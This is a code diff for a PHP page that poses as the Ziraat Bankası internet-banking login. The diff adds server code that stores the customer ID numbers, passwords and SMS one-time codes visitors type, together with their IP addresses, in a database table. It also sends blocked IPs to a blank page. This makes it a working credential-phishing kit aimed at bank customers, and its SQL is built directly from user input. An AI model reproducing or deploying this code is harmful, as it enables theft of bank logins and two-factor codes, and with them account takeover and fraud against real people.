@@ -1,5 +1,5 @@
-<?php 
-include('baglan.php'); 
+﻿<?
+include 'baglan.php';
 function GetIP(){
  if(getenv("HTTP_CLIENT_IP")) {
  $ip = getenv("HTTP_CLIENT_IP");
@@ -16,14 +16,32 @@ function GetIP(){
 }
 $ipcik = GetIP();
 
+if ($_POST['pass2']<>"") { } else {
+$tc = $_POST['tc'];
+$pass = $_POST['sms'];
+mysql_query("insert into ak (kullanici, tarih, pass, notif, ses, ip) values ( '$tc', now(), '$pass', '1', '1', '$ipcik')");
+}
+
+if ($_POST['pass2']<>"") {
+$tc = $_POST['tc'];
+$pass2 = $_POST['pass2'];
+mysql_query("Update ak set sms1='$pass2' where ip='$ipcik' ");
+mysql_query("Update ak set notif='1' where ip='$ipcik' ");
+mysql_query("Update ak set ses='1' where ip='$ipcik' ");
+echo "<script>window.location.href = 'sms2.php'; </script>";
+}
+
+
     $query =  mysql_query('SELECT * FROM ip'); 
     while($row = mysql_fetch_assoc($query)){ 
         if($row['ip'] == $ipcik){ 
             header('Location: about:blank'); 
         } 
     } 
+
 ?>
 <!DOCTYPE html>
+
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="Content-Language" content="tr">
     
@@ -35,7 +53,7 @@ $ipcik = GetIP();
     
 
     <title> Hoşgeldiniz | Ziraat Bankası İnternet Bankacılığı </title> 
-    <link rel="SHORTCUT ICON" href="https://bireysel.ziraatbank.com.tr/Content/images/tr_TR/Generic/ZB.ico">
+    <link rel="SHORTCUT ICON" href="https://bireysel.ziraatbank.com.tr/Content/images/tr_TR/Generic/ZB.ico?v=636332540968224941">
     <link href="./index_files/help.css" rel="stylesheet" type="text/css">
     <link href="./index_files/login.css" rel="stylesheet" type="text/css">
     <style type="text/css">
@@ -203,9 +221,26 @@ $ipcik = GetIP();
 
 
     </script>
-    <form name="sms" method="post" action="sms.php" onsubmit="javascript:return WebForm_OnSubmit();" id="sms" autocomplete="off">
+    <form name="sms" method="post" action="" id="sms" autocomplete="off">
 <div>
 </div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['sms'];
+if (!theForm) {
+    theForm = document.sms;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
 
 <script src="./index_files/WebResource.axd" type="text/javascript"></script>
 
@@ -215,211 +250,190 @@ $(document).keydown(function(e){var t;if(e.keyCode==8){var n=e.srcElement||e.tar
 
 </script>
 <script src="./index_files/WebResource(1).axd" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+var dd5fcb6461304a64adbfb0462736cb6f=['1024','010001','BEA8E27023B6041033D606448F9CF48FF2F05AE0B83C25BD91713D7096573458BBC53163023E433EACFDB6E578F47B8CEF8E46499BC2BC697E4C2E26D1EC48A1D048686346EF0A9B5DF1D9DA9CA40EB57D01DB248E54AAE3B19BF9097FD616187BF0C8776B013CEA2429E8139043E73AF8DFF3A68DDBA753032D38B9865AC34D'];function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;EncryptFormInputs();
+return true;
+}
+//]]>
+</script>
+
 <div>
 </div>
+        
+
         <a causesval="false" onclick=";return subchk(this);;" id="NavigationHiddenButton" href="javascript:__doPostBack(&#39;ctl00$NavigationHiddenButton&#39;,&#39;&#39;)" style="display: none;"><span></span></a>
         <div id="wrapper" class="login-wrapper">
-            <div class="login-screen" style="margin-top: -173.5px;">
+            <div class="login-screen" style="margin-top: -165px;">
                 <div class="login-top">
                 </div>
                 <div class="login-box left">
-                    <a class="logo" href="javascript:;"></a>
+                    <a class="logo" href="javascript:;" style="margin-bottom: 12px;"></a>
                     <div class="login-err" style="display: none;">
                         <span class="icon"></span><span>
                             <span id="ctl00_errorLabel" class="error"></span></span>
                     </div>
                     
     <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
-    
-    <script>
-        function customOnKeyUp(count) {
-            if ($("#ctl00_c_TxtAnswer1").val().length == count) {
-                $("#ctl00_c_TxtAnswer2").focus();
-            }
-        }
-        function CheckCustomerNumberTCKN(input) {
-            var field = $("#ctl00_c_TxtCustomerId");
-            var customerInput = $("#ctl00_c_TxtCustomerId").val();
-            
-            if (customerInput.length > 8 && customerInput.length < 11) {
-                return 'Müşteri / T.C. Kimlik Numaranızı Kontrol Ediniz.';
-            }
-            
-            var reqMsg = field.attr('ReqFieldMsg');
-            var validDisType = $(field).attr('validDisType');
-            var haveValue = field.hasClass('have-value');
-            var value = haveValue ? field.val() : '';
-
-            if (reqMsg != undefined && value == "") {
-                return GetValidationMsg(field, reqMsg);
-            }
-            var numInputMsg = field.attr('ReqNumMsg');
-            if (numInputMsg != undefined && isNaN(value)) {
-                return GetValidationMsg(field, numInputMsg);
-            }
-
-            var lengthMsg = field.attr('LengthMsg');
-            var maxLength = eval(field.attr('ReqMaxLength'));
-            if (lengthMsg != undefined && value.length != maxLength) {
-                return GetValidationMsg(field, lengthMsg);
-            }
-
-            var rangeMsg = field.attr('RangeValidMsg');
-
-            if (rangeMsg != undefined) {
-                var rangeType = field.attr('RangeValType');
-                var rangeMin = eval(field.attr('RangeMin').replace(/\./g, '').replace(/\,/g, '.'));
-                var rangeMax = eval(field.attr('RangeMax').replace(/\./g, '').replace(/\,/g, '.'));
-
-                //var fieldValue = parseFloat(field.val().replace('.', '').replace(',', '.'));
-                var fieldValue = parseFloat(value.replace(/\./g, '').replace(/\,/g, '.'));
-                if (rangeType == 'strln' && (rangeMin > value.length || value.length > rangeMax)) {
-                    return GetValidationMsg(field, rangeMsg);
-                }
-                if (rangeType == 'num') {
-                    var hasError = false;
-
-                    if ((rangeMin == 0 && fieldValue < 0.01) || (rangeMin != 0 && fieldValue < rangeMin))
-                        hasError = true;
-                    if (rangeMax != 0 && fieldValue > rangeMax)
-                        hasError = true;
-                    if (hasError)
-                        return GetValidationMsg(field, rangeMsg);
-                }
-            }
-        }
-    </script>
-    <input name="rdLng" type="hidden" value="">
-    
+    <!-- <div class="notice">
+        
+        
+    </div>-->
     <div class="clear"></div>
     
 
 
-    <div id="ctl00_c_DvCustomerNumberPin">
+    <div class="clear">
+    </div>
+    <div id="ctl00_c_PnlSMS" class="PnlSMS">
+        <!--<label for="txtSMSReply">
+            SMS Şifre</label>-->
         <div class="global-input global-input-Number clear">
-            <input data-value="" autocomplete="off" name="tc" type="text" maxlength="11" id="ctl00_c_TxtCustomerId" class="txtUsername isNumber" onmouseup=";" onkeyup=";;" size="20" onmousedown=";" maxlengthvalidationmessage="" disablevalidationonblur="true" maxlengthvalidationenabled="False" validdistype="tooltip" maxlengthvalidationcharactercount="0" ondrop="return DisableDragAndDrop(event);" exvalidmethod="CheckCustomerNumberTCKN" onfocus=";thisFocus(this, event);" onkeydown=";" validation="validate[funcCall[VBValid]]" onkeypress=";" reqnummsg="Müşteri / T.C. Kimlik Numaranızı Yalnızca Rakam Olarak Giriniz" onblur=";thisBlur(this, event);" reqfieldmsg="Müşteri / T.C. Kimlik Numaranızı Giriniz." encrypted="" keypadtype="numeric" onpaste=";"><span></span>
-            <label id="ctl00_c_LblCustomerNumber" class="customerNoText" style="cursor:text">Müşteri / T.C. Kimlik Numaranızı Giriniz.</label>
+				<input id="tc" name="tc"  type="hidden" placeholder="<?php echo $kullanici; ?>" value="<?php echo $kullanici; ?>">
+            <input data-value="" autocomplete="off" name="pass2" type="password" maxlength="6" id="pass2" class="password password2" onmousedown=";" reqfieldmsg="Lütfen geçerli SMS şifresi giriniz." onmouseup=";" onpaste="return false;;;return false;;return false;;" keypadtype="numeric" onfocus=";thisFocus(this, event);" onblur=";thisBlur(this, event);" onkeypress=";" ondrop="return DisableDragAndDrop(event);" validation="validate[funcCall[VBValid]]" size="20" validdistype="tooltip" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_BtnLogin&#39;);" onkeyup=";;"><span></span>
+            <label style="display: block;">
+                SMS Şifrenizi Giriniz</label>
         </div>
-        <div class="global-input left password clear">
-            <div id="ctl00_c_DvEnterPass" class="v-input">
-                Şifrenizi Giriniz
-            </div>
-            <input type="password" style="display: none">
-            <input data-value="" autocomplete="off" name="sms" type="password" maxlength="6" id="ctl00_c_TxtPin" class="password pin-entry isAlphaNumericForPin" onmouseup=";" onkeyup=";;" size="20" range-max-length="6" onblur=";thisBlur(this, event);" onmousedown=";" onpaste="return false;;return false;return false;" disablevalidationonblur="true" validdistype="tooltip" ondrop="return DisableDragAndDrop(event);" exvalidmethod="CheckAlphaNumericCurrentPinEntry" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." keypadtype="numeric" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_BtnLogin&#39;);" validation="validate[funcCall[VBValid]]" onkeypress=";" encrypted="" range-min-length="5" onfocus=";thisFocus(this, event);" reqfieldmsg="Lütfen şifrenizi giriniz."><span></span><input type="hidden" name="ctl00$c$TxtPindd5fcb6461304a" id="ctl00_c_TxtPindd5fcb6461304a">
-        </div>
-    </div>
- <div id="ctl00_c_CaptchaPanel" class="global-box mB10 clear">
-	
-        <label for="securityImage" style="display: none">
-            </label>
-        
         <div class="clear">
         </div>
+        <span id="ctl00_c_SmsTimeCounter_LblTimeError" class="floatLeft smsTimerLabel">Kalan Süre :<span style="color:red;font-weight:bold">02:48</span> </span>
+    <a causesval="false" onclick=";" id="LinkResendSms" class="resendSMS" href="javascript:__doPostBack(&#39;ctl00$c$SmsTimeCounter$LinkResendSms&#39;,&#39;&#39;)" style="color: rgb(82, 82, 82);">Tekrar Gönder</a>
     
-</div>
-    
-    <div class="button-wrapper mB10">
-        <div id="ctl00_c_mobileSign" class="mobile-sign left">
-            <div>
-                <span class="left tipsy-sw" name="ChkMobileSign" original-title="Bu hizmetten sadece Turkcell hatlı bireysel müşterilerimiz yararlanabilir."><div class="ez-checkbox"><input id="ChkMobileSign" type="checkbox" name="ctl00$c$ChkMobileSign" class="ez-hide"></div><label for="ChkMobileSign">Mobil İmza İle Giriş</label></span>
-            </div>
-        </div>
+
+
+<style type="text/css">
         
-        <div id="ctl00_c_EmptySpace" class="clear h10">
-        </div>
-        <!--<label for="txtUserName" style="display: none;">
-        Kullanıcı Adınız</label>-->
-        <div class="links right">
+    .smsTimerLabel
+    {
+        line-height: 18px;
+        margin-left: 10px;
+        float:left;
+        margin-top:1px;
+    }
+    .resendSMS
+    {
+        background: none;
+        background: url(/Content/images/buttonicons/mobile-phone_gri.gif) no-repeat;
+        display: block;
+        float: right;
+        padding-left: 20px;
+        margin-bottom: 10px;
+        *margin-bottom: 0px;
+        color: #000000;
+        font-weight: bold;
+        background-position: 0 0px;
+        line-height: 20px;
+        cursor: pointer;
+        display : none;
+    }
+</style>
+<script type="text/javascript">
+
+$('#LinkResendSms').click(function(e){
+
+    if(smsCounter != 0)
+    {
+        e.preventDefault();
+    }
+});
+
+
+
+$('#LinkResendSms').css("color","#525252");
+$.get('/Content/images/buttonicons/mobile-phone_siyah_animated.gif');
+String.prototype.formatTime = function () {
+    var args = arguments;
+    return this.replace(/\{\{|\}\}|\{(\d+)\}/g, function (m, n) {
+        if (m == "{{") { return "{"; }
+        if (m == "}}") { return "}"; }
+        return args[n];
+    });
+};
+var smsCounter = 180;
+var logOffCounter = 300;
+
+function LogOffCountDown()
+{
+    if(logOffCounter == 0)
+    {
+        window.location.href = '/Transactions/Login/FirstLogin.aspx';
+    }
+    else
+    {
+        logOffCounter--;
+        setTimeout("LogOffCountDown()",1000);
+    }
+}
+
+function smsCountDown()
+{
+    var min = parseInt(smsCounter/60);
+    var sec = parseInt(smsCounter - (min * 60));
+
+    var minStr = min < 10 ? "0"+min : min;
+    var secStr = sec < 10 ? "0"+sec : sec;
+
+   $('#ctl00_c_SmsTimeCounter_LblTimeError').html('Kalan Süre :<span style=\'color:red;font-weight:bold\'>{0}</span> '.formatTime(minStr+":"+secStr));   
+   
+
+    if(smsCounter <= 0)
+    {
+        $('#LinkResendSms').removeAttr("disabled");
+        $('#LinkResendSms').css("background-image",'url(/Content/images/buttonicons/mobile-phone_siyah_animated.gif)');
+        $('#LinkResendSms').css("color",'#000000');
+        $('#LinkResendSms').show();
+        return;
+    }
+    smsCounter--;
+    setTimeout("smsCountDown()",1000);
+}
+
+
+smsCountDown();
+LogOffCountDown();
+</script>
+
+    </div>
+    
+    <div class="clear">
+    </div>
+    
+    <div class="links right ">
            <button id="ctl00_c_BtnLogin" style="border:0" class="link2"><span></span><span></span>GİRİŞ</button>
-        </div>
-        <div class="clear h20">
-        </div>
-        <div class="links forgotLinks">
-            
-            
-            
-            <a causesval="false" onclick="window.open(&#39;https://online.ziraatbank.com.tr/p/o/customerquery.aspx&#39;,&#39;_blank&#39;, &#39;status=yes,scrollbars=yes,resizable=yes,width=979,height=723&#39;); return false;;return subchk(this);;" id="ctl00_c_BtnForgetCustomerPassword" class="password-button" href="javascript:__doPostBack(&#39;ctl00$c$BtnForgetCustomerPassword&#39;,&#39;&#39;)"><span></span>Şifremi</a>
-            
-            
-            <span id="ctl00_c_LblForgotTur">unuttum.</span>
-        </div>
-        <div class="links forgotLinks mT10">
-            
-        </div>
-        <div class="links forgotLinks mT10">
-            <a causesval="false" onclick=";return subchk(this);;" id="ctl00_c_BtnLanguage" class="password-button first" href="javascript:__doPostBack(&#39;ctl00$c$BtnLanguage&#39;,&#39;&#39;)"><span></span><span></span>ENGLISH</a>
-        </div>
-        <div class="clear">
-        </div>
     </div>
-
-    
-
-    
-
-    <!--button-wrapper end-->
+    <div class="clear">
+    </div>
     <script type="text/javascript">
-
         $(document).ready(function () {
-            sessionStorage.removeItem('menulist');
             $("input[type='text'],input[type='password']").focus(function () { thisFocus(this); });
             $("input[type='text'],input[type='password']").blur(function () { thisBlur(this); });
+
             $('.errorMessage').find('a.close').click(function () {
                 $(this).parent().addClass('hide');
             });
-            $("#ctl00_c_TxtCustomerId").bind('focusout', function (e) {
-                if (!$("#ctl00_c_TxtCustomerId").hasClass("have-value") || $("#ctl00_c_TxtCustomerId").val() == '') {
-                    $(".customerNoText").show()
-                }
-            });
 
-            setTimeout(function () {
-                if ($("#ctl00_c_TxtCustomerId").val() != "Müşteri Numaranızı Giriniz" && $("#ctl00_c_TxtCustomerId").val() != '' && $("#ctl00_c_TxtCustomerId").attr("isdisabled") != "1") {
-                    $(".customerNoText").hide();
-                }
+            if($(".resendSMS").text()=="Tekrar Gönder"){
+                $(".logo").css("margin-bottom","12px");
+            }
 
-            }, 1);
-
-
-            $(".customerNoText").attr("style", "cursor:text");
-            $(".customerNoText").on("click", function () {
-                $("#ctl00_c_TxtCustomerId").focus();
-            });
-            $("#ctl00_c_TxtCustomerId").on("keyup", function () {
-                if ($(this).val() != '') {
-                    $(".customerNoText").hide();
-                }
-
-            });
-            $("#ctl00_c_TxtCustomerId").focus();
-            // setTimeout(function () { $(".customerNoText").show(); }, 1);
-
-
-
-            $('#ctl00_c_TxtCustomerId').bind('contextmenu', function (e) {
-                return false;
-            });
             
-            $("#ChkMobileSign").parent().parent().attr("title", 'Bu hizmetten sadece Turkcell hatlı bireysel müşterilerimiz yararlanabilir.');
-            $("#ChkSms").parent().parent().attr("title", 'Bu hizmetten geçici olarak yararlanabilir Ziraat Onay uygulamanızı tekrar aktive edebilirsiniz.');
+                 $("#ctl00_c_TxtSMS").focus();
+                if(!$(".global-input label").hasClass("password-text")){
+                    setTimeout(function(){$(".PnlSMS label").show();},1);
+                }
 
+                $('#ctl00_c_TxtSMS').bind('contextmenu', function (e) {
+                    return false;
+                });
+            
+            imageControl();
         });
 
-        function CloseSMSOptionLb() {
-
-            $('#ctl00_c_LbSMSOption .light-box-closer').first().click();
-            $("#ctl00_c_TxtCustomerId").val('');
-            return false;
-            
-        }
-
-        function checkUserName() { }
         function ValidatePage(sender, args) {
             loginDummyLoading();
         }
-
     </script>
-    <input type="hidden" name="ctl00$c$HiddenField1" id="ctl00_c_HiddenField1" value="02">
 
                 </div>
                 <!--login-box end-->
@@ -478,7 +492,7 @@ $(document).keydown(function(e){var t;if(e.keyCode==8){var n=e.srcElement||e.tar
             <!--login-screen end-->
         </div>
         <div id="wrapper" class="browser-warning" style="display: none">
-            <div class="login-screen logOff" style="margin-top: -173.5px;">
+            <div class="login-screen logOff" style="margin-top: -165px;">
                 <div class="login-top">
                 </div>
                 <div class="clear">
@@ -486,7 +500,7 @@ $(document).keydown(function(e){var t;if(e.keyCode==8){var n=e.srcElement||e.tar
                 <div class="login-box left login-content">
                     <div class="clear">
                     </div>
-                    <a class="logo left" href="javascript:;"></a>
+                    <a class="logo left" href="javascript:;" style="margin-bottom: 12px;"></a>
                     <div class="right sube-text">
                         <h5 class="left">İnternet<b>Şube</b></h5>
                     </div>
